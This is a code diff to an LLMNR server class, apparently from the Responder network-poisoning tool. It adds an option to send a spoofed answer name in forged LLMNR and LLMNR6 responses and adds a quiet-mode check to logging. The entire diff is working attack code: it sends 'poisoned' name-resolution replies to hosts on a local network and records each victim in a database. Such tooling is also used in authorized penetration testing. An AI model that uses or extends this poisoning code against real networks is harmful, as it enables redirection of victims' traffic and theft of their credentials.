@@ -58,6 +58,10 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 		try:
 			data, soc = self.request
 			Name = Parse_LLMNR_Name(data).decode("latin-1")
+			if settings.Config.AnswerName is None:
+				AnswerName = Name
+			else:
+				AnswerName = settings.Config.AnswerName
 			LLMNRType = Parse_IPV6_Addr(data)
 
 			# Break out if we don't want to respond to this host
@@ -67,7 +71,9 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 			if data[2:4] == b'\x00\x00' and LLMNRType:
 				if settings.Config.AnalyzeMode:
 					LineHeader = "[Analyze mode: LLMNR]"
-					print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
+					# Don't print if in Quiet Mode
+					if not settings.Config.Quiet_Mode:
+						print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
 					SavePoisonersToDb({
 							'Poisoner': 'LLMNR', 
 							'SentToIp': self.client_address[0], 
@@ -78,14 +84,17 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 				elif LLMNRType == True:  # Poisoning Mode
 					#Default:
 					if settings.Config.TTL == None:
-						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
+						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName)
 					else:
-						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name, TTL=settings.Config.TTL)
+						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName, TTL=settings.Config.TTL)
 					Buffer1.calculate()
 					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
 					if not settings.Config.Quiet_Mode:
 						LineHeader = "[*] [LLMNR]"
-						print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
+						if settings.Config.AnswerName is None:
+							print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
+						else:
+							print(color("%s  Poisoned answer sent to %s for name %s (spoofed answer name %s)" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name, AnswerName), 2, 1))
 					SavePoisonersToDb({
 							'Poisoner': 'LLMNR', 
 							'SentToIp': self.client_address[0], 
@@ -96,14 +105,17 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 				elif LLMNRType == 'IPv6' and Have_IPv6:
 					#Default:
 					if settings.Config.TTL == None:
-						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name)
+						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName)
 					else:
-						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=Name, TTL=settings.Config.TTL)
+						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName, TTL=settings.Config.TTL)
 					Buffer1.calculate()
 					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
 					if not settings.Config.Quiet_Mode:
 						LineHeader = "[*] [LLMNR]"
-						print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
+						if settings.Config.AnswerName is None:
+							print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
+						else:
+							print(color("%s  Poisoned answer sent to %s for name %s (spoofed answer name %s)" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name, AnswerName), 2, 1))
 					SavePoisonersToDb({
 							'Poisoner': 'LLMNR6', 
 							'SentToIp': self.client_address[0], 
